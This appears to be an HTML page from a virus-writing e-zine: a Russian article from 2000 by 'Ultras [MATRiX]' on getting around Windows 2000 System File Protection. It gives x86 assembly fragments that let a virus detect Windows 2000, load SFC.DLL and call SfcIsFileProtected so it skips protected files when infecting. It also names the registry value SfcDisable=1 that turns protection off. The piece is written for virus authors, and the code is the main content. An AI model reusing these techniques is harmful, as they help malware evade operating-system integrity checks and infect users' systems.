<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>news</title>
<base target="_self">
</head>

<body topmargin="0" leftmargin="0" bgcolor="#E7BE7B" link="#CC0000" vlink="#993300" alink="#FF9900">

<Table border="0" cellPadding="0" cellSpacing="0" width="100%">
	<Tr>
		<Td valign="top" height="33">
			<Img src="../images/index_08.gif" width="6" height="33"></Td>
		<Td width="100%" background="../images/index_09.gif" valign="top" height="33">
            <img border="0" src="../images/kolesiko.gif" align="absmiddle" width="21" height="33"><font face="Arial" size="2"><b>
            SFP protects
            </b> - 11:07 - <i>by Ultras</i></font>
            </Td>
		<Td valign="top" height="33">
			<Img src="../images/index_10.gif" width="10" height="33"></Td>
     </Tr>
     <Tr>
		<Td background="../images/index_17.gif">
            &nbsp;</Td>
		<Td width="100%" bgcolor="#E7BE7B">
            <font face="Courier" size="3">
<pre>
   Решил  я  как то раз написать вирус который бы работал под Win2000, но
столкнулся  с  проблемой.  Эта проблема заключалось в том что вирус когда
пытался  заразить файлы под Win2000 некоторые из них выдавали сообщения в
стиле  обломись...  Потом от benny я узнал немного о SFP и вскоре я нашел
интересную  толзу  (по  моему  на elicz.cjb.net) которая отключала SFC. Я
поговорил  с  автором  он  мне много рассказал про SFP и прислал исходник
програмки...  Итак  как  отключить SFC, как узнать файл протект или нет и
многое  другое... Несмотря на то что про это писал GriYo я все таки решил
описать это на русском и по своему.

Хочу сказать большое спасибо: mort, benny, Elicz.

Итак о галимой защите в 2000 виндах...

   1)  Для  начало  вашему  вирусу  надо  проверить  в какой операционной
системе он работает:

call GetVersion               ;Получаем версию нашей операционной системы
cmp al,5                      ;проверим если 5 - Win2000
jne no_windie2000             ;выходим если не Win2000.

   2)  Потом  нам  нужно  загрузить  SFC.dll для проверки в дальнейшем на
защищенные файлы.

call SFC_name
db 'SFC.DLL',00h                ;имя нашей dll
SFC_name:
call LoadLibraryA               ;загрузим её
xchg eax,ebx
test ebx,ebx                    ;проверим вообще если dll
je NoSFC                        ;опз... нема
mov dword ptr [SFCDLL],ebx      ;сохраним для будущей работы

call SFC_api
db 'SfcIsFileProtected',00h     ;имя нужной нам SFC API функций
SFC_api:
push ebx                        ;адрес dll
call GetProcAddress             ;получим api адрес функций
test eax,eax
je NoSFC                        ;выходим если ошибка
mov dword ptr [SFCAPI], eax     ;сохрани для вызева

3) Потом ищем файл и проверяем защищен он или нет.

push имя файла                  ;параметр для имени проверяемого файла
push 00000000h                  ;нули.. так над0
call SfcIsFileProtected         ;вызываем api
or eax,eax                      ;проверяем если 0 - файл незащищен,
                                ;1 - защищен..
jnz again                       ;если 1 нахрен нам такой файл нужен


Отключить SFP можно через реестр, это очень просто

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

SfcDisable = 01 (true)

но это параметр будет работать только после перезапуска системы :(

   когда  я  дописывал  эту  статью  elicz  должен  был выпустить утилиту
которая должна была отключать SFP без перезагрузки... как я не знаю...

  ULTRAS[MATRiX]
What`s my age again

 Март-Апрель 2000

</pre>
            </font></Td>
		<Td background="../images/index_19.gif">
            &nbsp;</Td>
	</Tr>
	<Tr>
		<Td>
			<Img src="../images/index_44.gif" width="6" height="9"></Td>
		<Td background="../images/index_45.gif" height="9">
            <img border="0" src="../images/spacer.gif" width="9" height="9"></Td>
		<Td>
			<Img src="../images/index_46.gif" width="10" height="9"></Td>
	</Tr>
</Table>
<br>

</Table>
&nbsp;

</body>

</html>
